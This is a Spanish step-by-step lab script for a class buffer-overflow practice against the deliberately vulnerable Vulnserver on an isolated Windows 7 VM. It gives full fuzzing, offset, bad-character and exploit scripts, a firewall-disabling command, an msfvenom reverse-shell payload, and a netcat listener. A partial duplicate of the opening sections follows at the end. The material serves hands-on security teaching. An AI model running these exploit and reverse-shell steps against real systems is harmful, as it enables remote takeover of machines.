# 🎯 Guion Práctica 2: Buffer Overflow — Vulnserver (ultra claro)

**Entorno:** Kali = `192.168.190.129` · Victima 2 (Windows 7) = `192.168.190.132` · puerto del servidor = `9999` · puerto de la shell = `4444`

---

## 📖 LEE ESTO PRIMERO — cómo funciona el guion

### Símbolos que verás en cada paso

| Símbolo | Significado exacto |
| --- | --- |
| 🟢 | ANTES de hacer este paso, el servidor debe estar **RUNNING** (vivo). Verifica abajo a la derecha de Immunity que diga "Running" |
| 🔴 | DESPUÉS de este paso el servidor queda **PAUSED** (muerto). Ya no acepta conexiones hasta que lo reinicies |
| 🔁 | Aplica la **REGLA DEL REINICIO** (ver abajo) antes de continuar con el próximo script |
| 📹 | Texto sugerido para decir en cámara |
| ⚠️ | Error que ya te ocurrió en esta práctica — cuidado en este punto |

### 🟡 Pasos OPCIONALES

Los pasos que NO son necesarios aparecen así:

> 🟡 **PASO OPCIONAL — puedes saltarlo sin problema. Esto NO es necesario para que la práctica funcione.**

Todo lo que esté dentro de un recuadro con 🟡 es opcional. Todo lo que está FUERA del recuadro es obligatorio.

### 🔁 La REGLA DEL REINICIO (la lees cada vez que veas 🔁)

Hazla EXACTA y en este orden:

1. Cierra **Immunity Debugger** (la X de la ventana).
2. Cierra **vulnserver** (la ventana negra). Mientras está atachado a Immunity la ventana queda congelada; por eso se cierra Immunity PRIMERO.
3. Abre **vulnserver.exe** con clic derecho → **Ejecutar como administrador**. Si sale aviso de Firewall → **Permitir acceso**. NO cierres esa ventana negra nunca más.
4. Abre **Immunity Debugger** como administrador.
5. Menú **File → Attach → clic en `vulnserver` → botón Attach**.
6. Pulsa el botón **▶ Play** (Run program) en la barra de herramientas.
7. **Verifica**: abajo a la derecha de Immunity debe decir **Running**. Si dice "Paused", el servidor está muerto y ningún script va a funcionar.

### ¿Cuándo reinicio y cuándo NO?

| Situación | ¿Reinicio? |
| --- | --- |
| Acabo de tumbar el servidor con un script y voy a LEER el EIP o el ESP en Immunity | **NO** — se lee con el servidor en Paused, así se ve el valor |
| Voy a correr `pattern_offset.rb` en Kali | **NO** — es solo un cálculo local, no toca el servidor |
| Voy a correr `!mona modules`, `!mona find` o `!mona bytearray` | **NO** reinicias, pero vulnserver debe estar **corriendo como admin y atachado** en Immunity (File → Attach). Si no, `mona find` devuelve 0 pointers — te pasó |
| Voy a correr `!mona compare` | **NO** reinicias — se corre justo después del crash de badchars.py, con el servidor en **Paused** y leyendo el ESP actual |
| Voy a ejecutar el SIGUIENTE script que se conecta al servidor (pattern.py, overwrite.py, badchars.py, exploit.py) | **SÍ** — 🔁 regla del reinicio completa |
| Ya llegué al GOLPE FINAL (Paso 10) | Es distinto: ahí se cierra Immunity y se deja SOLO vulnserver corriendo. Es la única parte donde no se atacha Immunity |

### Reglas de las terminales en Kali

- **Terminal 1** = donde corre el listener `nc -nvlp 4444` (solo se usa en el Paso 10).
- **Terminal 2** = donde ejecutas los scripts (`python3 exploit.py`). Se abre con **Ctrl+Shift+T** sin cerrar la Terminal 1.
- Todos los scripts se ejecutan **SIEMPRE con `python3` delante**: `python3 pattern.py`. Si escribes solo `pattern.py` sale "no se encontró la orden".
- Todos los archivos se crean con `nano nombre.py`, se guardan con **Ctrl+O → Enter** y se cierran con **Ctrl+X**.
- Después de crear o editar CADA archivo, verifica con `cat nombre.py` antes de ejecutarlo.

---

## PASO 0 — Preparación (se hace UNA sola vez, antes de todo)

1. Descarga vulnserver: `https://github.com/stephenbradshaw/vulnserver` → archivos **vulnserver.exe** y **essfunc.dll**. PONLOS JUNTOS en `C:\vulnserver\` (la DLL debe estar en la misma carpeta que el exe o no aparecerá en mona)(nota: la carpeta `vulnserver` hay que crearla).
2. Descarga Immunity Debugger: `https://github.com/kbandla/ImmunityDebugger/releases` → `ImmunityDebugger_1.85_setup.exe`. Instálalo como administrador.
   - Al terminar el setup y darle Aceptar, se abre SOLO el instalador de **Python 2.7**: dale `Install for all users`, ruta por defecto `C:\Python27\`, Finish.
   - **Si esa ventana NO se abre** (o si `!mona` da "error importing module" después), descarga Python 2.7 manualmente: `https://www.python.org/downloads/release/python-2718/` → baja el **Windows x86 MSI installer** (¡el de 32 bits, NO el "x86-64"!) → Instalar para todos los usuarios → ruta `C:\Python27\`.
   - ⚠️ Immunity es de 32 bits y SOLO funciona con Python 2.7 de 32 bits. Si instalas el de 64 bits, mona.py no carga. (Ojo: este Python 2.7 es para Immunity en la VÍCTIMA; los scripts de ataque van en Kali con Python 3 — no los mezcles.)
3. Descarga mona.py: `https://github.com/corelan/mona` → botón **Raw** → Guardar como → destino `C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands\`. En "Tipo" elige **Todos los archivos** o quedará como `mona.py.txt` y mona no funcionará.
4. En Victima 2 abre CMD **como administrador** y ejecuta:
   ```
   netsh advfirewall set allprofiles state off
   ```
5. Ahora monta el servidor (esto es el estado normal de arranque):
   - Abre `C:\vulnserver\vulnserver.exe` → clic derecho → **Ejecutar como administrador** → Firewall → **Permitir acceso**.
   - Abre **Immunity Debugger como administrador**.
   - En la barra de comandos de abajo escribe y ejecuta con Enter:
     ```
     !mona
     ```
     Si sale la ayuda de mona, está bien instalado. Una sola vez más:
     ```
     !mona config -set workingfolder c:\mona\%p
     ```
   - **File → Attach → vulnserver → Attach**.
   - Pulsa **▶ Play**. Abajo a la derecha debe decir **Running**. 🟢

> ⚠️ Immunity arranca con el proceso en PAUSED. Si no le das Play, nada conecta. Este fue uno de tus errores: verificar siempre el "Running" abajo a la derecha antes de cada script.

---

## PASO 1 — Verificar la conexión 🟢

En Kali:

```bash
nc -nv 192.168.190.132 9999
```

Escribe `HELP` y Enter (tiene que listar TRUN entre los comandos). Sal con **Ctrl+C**.

> 📹 "Confirmo que la máquina víctima está viva y que el puerto 9999 del servidor vulnerable está abierto."

---

## PASO 2 — Spiking (identificar el comando vulnerable) 🟢

> 🟡 **PASO OPCIONAL — puedes saltarlo sin problema. Esto NO es necesario para que la práctica funcione.** Es solo para mostrar en el video que STATS no tumba el servidor, como hace el manual. Si lo haces, primero asegúrate de que el servidor está en Running (🟢).
>
> Crea el archivo con:
>
> ```bash
> nano stats.spk
> ```
>
> Pega exactamente (dice STATS sin espacio):
>
> ```
> s_readline();
> s_string("STATS");
> s_string_variable("0");
> ```
>
> Guarda: **Ctrl+O → Enter → Ctrl+X**. Envíalo:
>
> ```bash
> generic_send_tcp 192.168.190.132 9999 stats.spk 0 0
> ```
>
> Immunity sigue en **Running** (STATS no es vulnerable) → eso es lo que querías mostrar. Detenlo con **Ctrl+C**.

Ahora el paso obligatorio. El servidor debe estar en **Running** (🟢). Crea el archivo:

```bash
nano trun.spk
```

Pega exactamente (⚠️ `"TRUN "` lleva un ESPACIO antes de la comilla de cierre):

```
s_readline();
s_string("TRUN ");
s_string_variable("0");
```

Guarda: **Ctrl+O → Enter → Ctrl+X**. Envíalo:

```bash
generic_send_tcp 192.168.190.132 9999 trun.spk 0 0
```

**Qué esperar:** Immunity pasa a **Paused** (🔴) = TRUN es vulnerable a buffer overflow.

> ⚠️ A veces Spike termina con `Done.` y Immunity sigue en Running (no generó datos suficientes para tumbarlo). Es normal. Fuérzalo manualmente para demostrar la vulnerabilidad:
>
> ```bash
> python3 -c "import socket; s=socket.socket(); s.connect(('192.168.190.132', 9999)); s.send(b'TRUN /.:/' + b'A'*5000); s.close()"
> ```
>
> Si 5000 no lo tumba, prueba cambiando el número a 10000. Con que Immunity pase a **Paused** ya está demostrado.

> 📹 "Envío datos aleatorios al comando TRUN con Spike. Si el proceso pasa a Paused, TRUN es vulnerable a buffer overflow."

**Estado actual: 🔴 servidor en Paused (muerto).** Antes del siguiente paso → **🔁 regla del reinicio**.

---

## PASO 3 — Fuzzing (tamaño del crash) 🟢 (después de 🔁 reiniciar)

Crea el archivo:

```bash
nano fuzz.py
```

Pega esto:

```python
import socket, time, sys
ip = "192.168.190.132"
port = 9999
prefix = b"TRUN /.:/"
buffer = b"A" * 100
while True:
    try:
        s = socket.socket()
        s.connect((ip, port))
        s.send(prefix + buffer)
        s.close()
        print("Fuzzing with %s bytes" % len(buffer))
        buffer += b"A" * 100
        time.sleep(1)
    except Exception:
        print("Crashed at %s bytes" % len(buffer))
        sys.exit(0)
```

Guarda: **Ctrl+O → Enter → Ctrl+X**. Verifica que quedó bien:

```bash
cat fuzz.py
```

Ejecuta:

```bash
python3 fuzz.py
```

**Qué esperar:** los números de bytes suben (100, 200, 300...). Vigila **Immunity**, no solo la terminal: cuando cambie a **Paused** (🔴), el crash ya ocurrió. Anota en qué número iba la terminal y detén el fuzzer con **Ctrl+C**.

> ⚠️ Tu fuzzer llegó hasta 15000 sin darse cuenta del crash: el servidor ya estaba muerto y las conexiones fallaban en silencio. LA PRUEBA ESTÁ EN IMMUNITY: Paused = cayó. No es crítico saber el número exacto; el offset de este servidor es 2003 y con un patrón de 3000 es suficiente.

> 📹 "Envío cada vez más datos hasta que el servidor se cae, para saber de qué tamaño es el buffer."

**Estado actual: 🔴 servidor en Paused.** Antes del siguiente paso → **🔁 regla del reinicio**.

---

## PASO 4 — Offset (posición exacta del EIP) 🟢 (después de 🔁 reiniciar)

**1. Genera el patrón DIRECTO a un archivo** (nunca lo copies/peges a mano: son 3000 caracteres y el pegado se corta):

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000 > patron.txt
```

**2. Crea el script que lo envía:**

```bash
nano pattern.py
```

Pega esto (la línea `open("patron.txt", "rb").read().strip()` lee el patrón del archivo — no hay nada que pegar a mano):

```python
import socket
ip = "192.168.190.132"
port = 9999
prefix = b"TRUN /.:/"
pattern = open("patron.txt", "rb").read().strip()
s = socket.socket()
s.connect((ip, port))
s.send(prefix + pattern)
s.close()
print("Patrón enviado:", len(pattern), "bytes")
```

Guarda: **Ctrl+O → Enter → Ctrl+X**. Verifica con:

```bash
cat pattern.py
```

**3. Envíalo** (servidor en Running 🟢):

```bash
python3 pattern.py
```

Debe imprimir `Patrón enviado: 3000 bytes`. El servidor queda en **Paused** (🔴).

> ⚠️ Si escribes solo `pattern.py` sale "no se encontró la orden". Siempre `python3 pattern.py`.

**4. Lee el EIP — NO reinicies todavía.** En Immunity, panel de registros (arriba a la derecha), fila **EIP**: anota el valor. Debe ser 4 caracteres alfanuméricos (ej. `386F4337`).

- Si el EIP tiene caracteres raros (ej. `76F1000D` con números que no parecen letras del patrón) → ese crash NO es del patrón: el script no se ejecutó o estás viendo un crash viejo. Repite el paso completo con 🔁 reinicio incluido.
- Si sale `41414141` → se enviaron puras A's → revisa el `cat pattern.py`.

**5. Calcula el offset** (esto NO toca el servidor, se hace con el servidor pausado):

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
```

(cambia `386F4337` por TU EIP). Debe decir:

```
[*] Exact match at offset 2003
```

> 📹 "El servidor cayó y el EIP quedó con el valor del patrón; con ese valor calculo la posición exacta donde se sobrescribe el registro: offset 2003."

**Estado actual: 🔴 servidor en Paused.** Antes del siguiente paso → **🔁 regla del reinicio**.

---

## PASO 5 — Confirmar control del EIP (overwrite.py) 🟢 (después de 🔁 reiniciar)

Crea el archivo:

```bash
nano overwrite.py
```

Pega esto:

```python
import socket
ip = "192.168.190.132"
port = 9999
prefix = b"TRUN /.:/"
buffer = b"A" * 2003 + b"B" * 4
s = socket.socket()
s.connect((ip, port))
s.send(prefix + buffer)
s.close()
print("Payload enviado:", len(buffer), "bytes")
```

Guarda: **Ctrl+O → Enter → Ctrl+X**. Verifica con `cat overwrite.py`. Ejecuta:

```bash
python3 overwrite.py
```

**Qué esperar:** Immunity pasa a **Paused** (🔴), EIP = **`42424242`** y mensaje "Access violation when executing [42424242]". Eso confirma que controlas el registro.

> ⚠️ Si "corre" sin crash y todo sigue en Running → el servidor estaba muerto del crash anterior. 🔁 Reinicia y repite. SIEMPRE reinicias ANTES de cada script, no después de leer el EIP.

> 📹 "Con 2003 letras A y 4 letras B, el EIP queda en 42424242. Confirmo que controlo el registro de instrucciones."

**Estado actual: 🔴 servidor en Paused.** Antes del siguiente paso → **🔁 regla del reinicio**.

---

## PASO 6 — Bad characters 🟢 (después de 🔁 reiniciar)

**1. Genera el bytearray con mona.** Con el servidor en **Running** (🟢), en la barra de comandos de Immunity (abajo):

```
!mona bytearray -b "\x00"
```

Esto crea `c:\mona\vulnserver\bytearray.bin` (todos los bytes de `\x01` a `\xff`, sin el `\x00`). Anota la carpeta que muestra el log.

**2. Crea el script en KALI** (⚠️ este script va en Kali, NO en la barra de comandos de Immunity — ya te pasó escribirlo ahí):

```bash
nano badchars.py
```

Pega esto (la línea `bytes(range(1, 256))` genera sola el array de `\x01` a `\xff`; no escribas la lista a mano):

```python
import socket
ip = "192.168.190.132"
port = 9999
prefix = b"TRUN /.:/"
offset = 2003
badchars = bytes(range(1, 256))
buffer = prefix + b"A" * offset + b"B" * 4 + badchars
s = socket.socket()
s.connect((ip, port))
s.send(buffer)
s.close()
print("Payload enviado:", len(buffer), "bytes")
```

Guarda: **Ctrl+O → Enter → Ctrl+X**. Verifica con `cat badchars.py`. Ejecuta:

```bash
python3 badchars.py
```

Debe imprimir `Payload enviado: 2262 bytes`. El servidor queda en **Paused** (🔴) con EIP `42424242`.

**3. Lee la dirección del ESP — NO reinicies todavía.** En el panel de registros (arriba a la derecha), fila **ESP**: anota el número tipo `0012F8B0`.

> ⚠️ ESE número es la dirección de memoria donde cayeron tus bytes y es lo que va en el `-a` del compare. NO uses el valor del EIP (`42424242`) — eso es contenido, no una dirección (ya te pasó). Y el ESP **cambia en cada crash**: lee siempre el valor ACTUAL de este crash, nunca uno viejo.

**4. Compara con mona** (se hace con el servidor pausado):

```
!mona compare -f c:\mona\vulnserver\bytearray.bin -a 0012F8B0
```

(cambia `0012F8B0` por TU ESP actual). Se abre una ventana de comparación. **Así sabes si te salió bien o mal:**

**✅ SALIÓ BIEN — verás este mensaje exacto (o muy parecido):**

```
Hooray, normal shellcode UNMODIFIED !!!
```

Significa: los 255 bytes llegaron a memoria **intactos, sin corromper ninguno**. Por lo tanto el único bad char es `\x00` (el que ya excluiste al generar el bytearray). No hay nada más que anotar: en el Paso 8 usarás `-b "\x00"` solamente.

> 📹 Si salió BIEN, di esto: *"Comparo lo que llegó a memoria con lo que envié. Mona dice 'unmodified': los bytes llegaron intactos, así que el único carácter que corrompe el servidor es el byte nulo \\x00. Ese será el único bad char que excluiré de mi shellcode."*

**❌ SALIÓ MAL (hay bad chars adicionales) — verás líneas como estas:**

```
Possibly bad chars:
BadChars: 00 01 2e
Corruption after 2 bytes
```

Significa: esos bytes de la lista **NO llegaron iguales a memoria** — el servidor los corrompió. Cada byte de esa lista es un bad char adicional: **anótalos**. Tus bad chars totales = `\x00` + los de la lista. En el Paso 8 los pones TODOS en el `-b` (ejemplo: lista `00 01` → `-b "\x00\x01"`).

> 📹 Si salió MAL, di esto: *"Mona detectó que el servidor corrompe estos bytes: 00, 01... Los anoto como bad characters y los excluiré del shellcode para que no rompan mi exploit."*

**⚠️ IMPORTANTE:** "salió mal" no significa que hiciste el paso mal — los bad chars son una propiedad del servidor vulnerable, no un error tuyo. El paso está bien hecho en ambos casos; lo que cambia es la LISTA de bad chars que te llevas al Paso 8. (En una misma máquina puede salir distinto entre corridas: una vez marcó `00 01` y otra salió unmodified — siempre manda lo que diga TU compare de HOY.)

> ⚠️ El orden importa: el compare se ejecuta DESPUÉS de que badchars.py tumbe el servidor. Si lo corres antes del crash, compara contra cualquier cosa.

**Estado actual: 🔴 servidor en Paused.** Antes del siguiente paso → **🔁 regla del reinicio**.

---

## PASO 7 — JMP ESP en essfunc.dll 🟢 (después de 🔁 reiniciar)

**1. Lista los módulos.** Con el servidor en **Running** (🟢), en Immunity:

```
!mona modules
```

Se abre una tabla con columnas: `Base | Size | Rebase | SafeSEH | ASLR | CFG | NXCompat | OS Dll | Version | Modulename & Path`.

**Cómo leerla:** ve a la fila que termina en `essfunc.dll` y mira las 5 columnas del medio. Debes ver:

- **Rebase:** False ✔
- **SafeSEH:** False ✔
- **ASLR:** False ✔
- **CFG:** False ✔
- **NXCompat:** False ✔ (esta columna ES el "DEP")

False = protección desactivada = la DLL es explotable. Si alguna dijera True, habría que buscar otro módulo.

> 📹 "essfunc.dll aparece sin ASLR, sin DEP (NXCompat), sin SafeSEH ni CFG: no tiene protecciones, así que puedo usarla para saltar a mi shellcode."

**2. Busca la instrucción JMP ESP** (en la barra de Immunity; escribe los caracteres exactos: barra invertida `\`, luego `xff`, luego `\xe4`, todo entre comillas dobles rectas y sin espacios):

```
!mona find -s "\xff\xe4" -m essfunc.dll
```

Debe decir `Found a total of 9 pointers` y listar direcciones. Anota la **primera** (en tu máquina fue **`625011af`**).

> ⚠️ Si dice `Found a total of 0 pointers` → **vulnserver no estaba corriendo/atachado**. Verifica que vulnserver esté abierto como admin y atachado en Immunity (File → Attach), y repite el comando.

> ⚠️ Usa SIEMPRE la dirección que te imprima TU mona find, no la de otra guía. La dirección se escribe al revés en el exploit (little-endian): `625011af` → `\xaf\x11\x50\x62`. Si te saliera otra (ej. `760011af`) → `\xaf\x11\x00\x76`.

> 🟡 **PASO OPCIONAL — puedes saltarlo sin problema. Esto NO es necesario para que la práctica funcione.** El manual muestra cómo verificar que `ffe4` es el código de JMP ESP:
>
> ```bash
> /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
> ```
>
> Escribe `JMP ESP` y Enter → sale `ffe4`. Sal con `exit`.

> 📹 "Busco un módulo sin protecciones y una instrucción JMP ESP para saltar a mi shellcode cuando sobrescriba el EIP."

**Estado actual: servidor en Running (🟢) — este paso no tumba nada.** Igual, antes del Paso 10 se cierra Immunity, así que el estado aquí no es crítico.

---

## PASO 8 — Shellcode (en Kali; LHOST es la IP de KALI)

⚠️ **LHOST es SIEMPRE la IP de Kali (`192.168.190.129`), nunca la de la víctima.**

⚠️ Los bad chars de `-b` son los que te marcó TU compare del Paso 6 — SIEMPRE los de tu corrida de HOY (una corrida puede dar solo `\x00` y otra `\x00\x01`; manda lo que diga tu compare):

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.190.129 LPORT=4444 EXITFUNC=thread -f python -a x86 -b "\x00"
```

(esa línea es para el caso más común: compare "unmodified" → solo `\x00`. Si tu compare marcó `\x01` adicional, usa `-b "\x00\x01"`. Si marcó otros bytes, agrégalos todos al mismo `-b`.)

**Qué esperar (todo esto es NORMAL, no son errores):**

- `No platform was selected, choosing Msf::Module::Platform::Windows` → aviso informativo.
- `shikata_ga_nai succeeded with size 351` → msfvenom codificó el payload para evitar los bad chars.
- Las líneas `buf =  b""` y `buf += b"\xda\xcb..."` → **eso es tu shellcode** en formato Python. Va al exploit.py del Paso 9.

> 📹 "Genero el shellcode de reverse shell apuntando a mi Kali en el puerto 4444, excluyendo los bad characters que detecté."

---

## PASO 9 — Exploit final (exploit.py) 🟢

**1. Crea el archivo:**

```bash
nano exploit.py
```

**2. Pega esta PLANTILLA completa:**

```python
import socket
ip = "192.168.190.132"
port = 9999
prefix = b"TRUN /.:/"
overflow = b"A" * 2003
retn = b"\xaf\x11\x50\x62"   # 625011af little-endian
padding = b"\x90" * 16
buf = b""
buf += b"PEGA_EL_BUF_DE_MSFVENOM"
buffer = prefix + overflow + retn + padding + buf
s = socket.socket()
s.connect((ip, port))
s.send(buffer)
s.close()
print("Exploit enviado.")
```

Guarda por ahora: **Ctrl+O → Enter** (no cierres nano todavía).

**3. Ahora inserta TU shellcode — hazlo EXACTO así, que aquí ya te rompió dos veces:**

- En la terminal de Kali (donde corriste msfvenom), selecciona y copia TODAS las líneas `buf += b"..."` de tu msfvenom — **desde la PRIMERA línea `buf +=` hasta la ÚLTIMA línea `buf +=`**.
- ⚠️ **NO copies la primera línea `buf =  b""` de msfvenom** — la plantilla ya tiene su propio `buf = b""`. Si la pegas también, se crea una línea rota tipo `buf += buf =  b""` que da SyntaxError (te pasó).
- En nano, ponte sobre la línea `buf += b"PEGA_EL_BUF_DE_MSFVENOM"` y **bórrala** (Ctrl+K).
- En su lugar pega las líneas copiadas.
- ⚠️ Si estás reemplazando un shellcode VIEJO por uno nuevo: borra TODAS las líneas buf viejas primero (de `buf = b""` hasta la última `buf +=`) y pega limpio. Nunca mezcles dos shellcodes — te quedó pegada una línea del shellcode anterior (`\xad\x2e\xa1`) al final del nuevo.

**4. Verifica con `cat exploit.py`.** Esta es tu checklist de verificación (todo debe cumplirse):**

- `buf = b""` aparece **EXACTAMENTE una vez**.
- NO existe ninguna línea `buf += buf` (pegado doble).
- La PRIMERA línea del shellcode es la primera `buf += b"..."` de TU msfvenom reciente.
- La ÚLTIMA línea del buf es la última línea de TU msfvenom reciente — no una línea de un shellcode viejo.
- `retn = b"\xaf\x11\x50\x62"` con TU dirección de mona find al revés.
- El `LHOST` del shellcode ya quedó adentro (no se toca aquí, msfvenom ya lo puso).

Guarda: **Ctrl+O → Enter → Ctrl+X**.

**NO ejecutes todavía.** Primero el Paso 10, que tiene un orden estricto.

---

## PASO 10 — EL GOLPE FINAL (orden estricto, aquí se cambia la regla)

> ⚠️ **Este es el ÚNICO momento de toda la práctica donde vulnserver corre SIN Immunity.** La shell no sale si Immunity está abierto con el proceso pausado o atachado.

**1. Limpia el puerto 4444** (por si quedó el handler de Armitage de la otra práctica ocupándolo):

```bash
sudo pkill -f msfrpcd
```

(y cierra Armitage si lo tienes abierto).

**2. En Victima 2 — cierra Immunity Debugger** (la X). Luego **verifica que la ventana negra de vulnserver SIGA viva** (debe verse "Waiting for client connections"). Si al cerrar Immunity se cerró también vulnserver:

- Abre `C:\vulnserver\vulnserver.exe` → clic derecho → **Ejecutar como administrador** → Firewall → Permitir acceso. Déjalo corriendo SOLO, sin Immunity.

**3. En Kali — Terminal 1: el listener PRIMERO:**

```bash
nc -nvlp 4444
```

Se queda esperando ("listening on [any] 4444..."). **NO cierres ni toques esa terminal.** Ahí va a aparecer la shell.

**4. En Kali — Terminal 2 (Ctrl+Shift+T, sin cerrar la Terminal 1):**

```bash
python3 exploit.py
```

**5. LA SHELL APARECE EN LA TERMINAL 1** — la que tiene `nc -nvlp 4444`. VUELVE a esa terminal: debe haber aparecido el prompt de Windows (algo como `C:\Users\...>`). Ahí escribes los comandos.

> ⚠️ Esto es clave: los comandos de la shell NO se escriben en la Terminal 2 (la del exploit) ni en ninguna otra. Se escriben en la **Terminal 1, la del netcat**. Si escribes `whoami` y no responde, mira si estás en la terminal correcta.

> ⚠️ Si la Terminal 1 se queda muda tras el exploit: ¿mataste el handler de Armitage (paso 1)? ¿vulnserver está corriendo solo? ¿ejecutaste el `nc` ANTES del exploit? Revisa las tres en ese orden.

> 📹 "Ejecuto el exploit completo: relleno el buffer, sobrescribo el EIP con la dirección del JMP ESP y el shellcode me devuelve una shell inversa en mi Kali."

---

## PASO 11 — Demostración de acceso (en la Terminal 1, la del netcat)

Con la shell abierta en la Terminal 1, escribe:

```
whoami
```

Debe responder con el usuario de la víctima (ej. `victima2\luis mendez`). Luego:

```
ipconfig
```

Debe mostrar la `192.168.190.132` de la víctima — prueba total de que estás DENTRO de la máquina remota.

> 🟡 **PASO OPCIONAL — puedes saltarlo sin problema. Esto NO es necesario para que la práctica funcione.** Comandos extra si quieres lucir el acceso en el video (siempre en la Terminal 1):
>
> ```
> systeminfo
> dir
> net user
> ```

> 📹 "Con whoami e ipconfig confirmo que tengo acceso total a la máquina víctima desde mi Kali."

**Sobre el PDF del manual:** ahí aparece "whoami, getuid, getsystem", pero `getuid` y `getsystem` son comandos de **Meterpreter** y NO existen en esta shell de netcat. Si el profesor pregunta: "getuid y getsystem corresponden a una sesión Meterpreter, que es la práctica de Armitage; en una reverse shell cruda el comando equivalente es whoami".

---

## 🔁 ¿Vas a repetir el exploit (re-grabar)?

Después de una shell exitosa el servidor queda congelado. Para repetir todo el golpe final:

1. En la Terminal 1 cierra la shell: **Ctrl+C** (se cierra el netcat).
2. En Victima 2: cierra vulnserver congelado y **ábrelo de nuevo como administrador** (sin Immunity).
3. Terminal 1: `nc -nvlp 4444`
4. Terminal 2: `python3 exploit.py`
5. Vuelve a la Terminal 1 → `whoami`.

---

<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>


# 🎯 Guion Práctica 2: Buffer Overflow — Vulnserver (ultra claro)

**Entorno:** Kali = `192.168.190.129` · Victima 2 (Windows 7) = `192.168.190.132` · puerto del servidor = `9999` · puerto de la shell = `4444`

---

## 📖 LEE ESTO PRIMERO — cómo funciona el guion

### Símbolos que verás en cada paso


| Símbolo | Significado exacto                                                                                                              |
| ------- | ------------------------------------------------------------------------------------------------------------------------------- |
| 🟢      | ANTES de hacer este paso, el servidor debe estar **RUNNING** (vivo). Verifica abajo a la derecha de Immunity que diga "Running" |
| 🔴      | DESPUÉS de este paso el servidor queda **PAUSED** (muerto). Ya no acepta conexiones hasta que lo reinicies                      |
| 🔁      | Aplica la **REGLA DEL REINICIO** (ver abajo) antes de continuar con el próximo script                                           |
| 📹      | Texto sugerido para decir en cámara                                                                                             |
| ⚠️      | Error que ya te ocurrió en esta práctica — cuidado en este punto                                                                |


### 🟡 Pasos OPCIONALES

Los pasos que NO son necesarios aparecen así:

> 🟡 **PASO OPCIONAL — puedes saltarlo sin problema. Esto NO es necesario para que la práctica funcione.**

Todo lo que esté dentro de un recuadro con 🟡 es opcional. Todo lo que está FUERA del recuadro es obligatorio.

### 🔁 La REGLA DEL REINICIO (la lees cada vez que veas 🔁)

Hazla EXACTA y en este orden:

1. Cierra **Immunity Debugger** (la X de la ventana).
2. Cierra **vulnserver** (la ventana negra). Mientras está atachado a Immunity la ventana queda congelada; por eso se cierra Immunity PRIMERO.
3. Abre **vulnserver.exe** con clic derecho → **Ejecutar como administrador**. Si sale aviso de Firewall → **Permitir acceso**. NO cierres esa ventana negra nunca más.
4. Abre **Immunity Debugger** como administrador.
5. Menú **File → Attach → clic en `vulnserver` → botón Attach**.
6. Pulsa el botón **▶ Play** (Run program) en la barra de herramientas.
7. **Verifica**: abajo a la derecha de Immunity debe decir **Running**. Si dice "Paused", el servidor está muerto y ningún script va a funcionar.

### ¿Cuándo reinicio y cuándo NO?


| Situación                                                                                                         | ¿Reinicio?                                                                                                                                                     |
| ----------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Acabo de tumbar el servidor con un script y voy a LEER el EIP o el ESP en Immunity                                | **NO** — se lee con el servidor en Paused, así se ve el valor                                                                                                  |
| Voy a correr `pattern_offset.rb` en Kali                                                                          | **NO** — es solo un cálculo local, no toca el servidor                                                                                                         |
| Voy a correr `!mona modules`, `!mona find` o `!mona bytearray`                                                    | **NO** reinicias, pero vulnserver debe estar **corriendo como admin y atachado** en Immunity (File → Attach). Si no, `mona find` devuelve 0 pointers — te pasó |
| Voy a correr `!mona compare`                                                                                      | **NO** reinicias — se corre justo después del crash de badchars.py, con el servidor en **Paused** y leyendo el ESP actual                                      |
| Voy a ejecutar el SIGUIENTE script que se conecta al servidor (pattern.py, overwrite.py, badchars.py, exploit.py) | **SÍ** — 🔁 regla del reinicio completa                                                                                                                        |
| Ya llegué al GOLPE FINAL (Paso 10)                                                                                | Es distinto: ahí se cierra Immunity y se deja SOLO vulnserver corriendo. Es la única parte donde no se atacha Immunity                                         |


### Reglas de las terminales en Kali

- **Terminal 1** = donde corre el listener `nc -nvlp 4444` (solo se usa en el Paso 10).
- **Terminal 2** = donde ejecutas los scripts (`python3 exploit.py`). Se abre con **Ctrl+Shift+T** sin cerrar la Terminal 1.
- Todos los scripts se ejecutan **SIEMPRE con `python3` delante**: `python3 pattern.py`. Si escribes solo `pattern.py` sale "no se encontró la orden".
- Todos los archivos se crean con `nano nombre.py`, se guardan con **Ctrl+O → Enter** y se cierran con **Ctrl+X**.
- Después de crear o editar CADA archivo, verifica con `cat nombre.py` antes de ejecutarlo.

---

## PASO 0 — Preparación (se hace UNA sola vez, antes de todo)

1. Descarga vulnserver: `https://github.com/stephenbradshaw/vulnserver` → archivos **vulnserver.exe** y **essfunc.dll**. PONLOS JUNTOS en `C:\vulnserver\` (la DLL debe estar en la misma carpeta que el exe o no aparecerá en mona).
2. Descarga Immunity Debugger: `https://github.com/kbandla/ImmunityDebugger/releases` → `ImmunityDebugger_1.85_setup.exe`. Instálalo como administrador. Si al final se abre el instalador de Python 2.7, instala con opciones por defecto.
3. Descarga mona.py: `https://github.com/corelan/mona` → botón **Raw** → Guardar como → destino `C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands\`. En "Tipo" elige \*\*Todos los archivos\*\* o quedará como `mona.py.txt` y mona no funcionará.
4. En Victima 2 abre CMD **como administrador** y ejecuta:
  ```
   netsh advfirewall set allprofiles state off
  ```
5. Ahora monta el servidor (esto es el estado normal de arranque):
  - Abre `C:\vulnserver\vulnserver.exe` → clic derecho → **Ejecutar como administrador** → Firewall → **Permitir acceso**.
  - Abre **Immunity Debugger como administrador**.
  - En la barra de comandos de abajo escribe y ejecuta con Enter:
    ```
    !mona
    ```
    Si sale la ayuda de mona, está bien instalado. Una sola vez más:
    ```
    !mona config -set workingfolder c:\mona\%p
    ```
  - **File → Attach → vulnserver → Attach**.
  - Pulsa **▶ Play**. Abajo a la derecha debe decir **Running**. 🟢

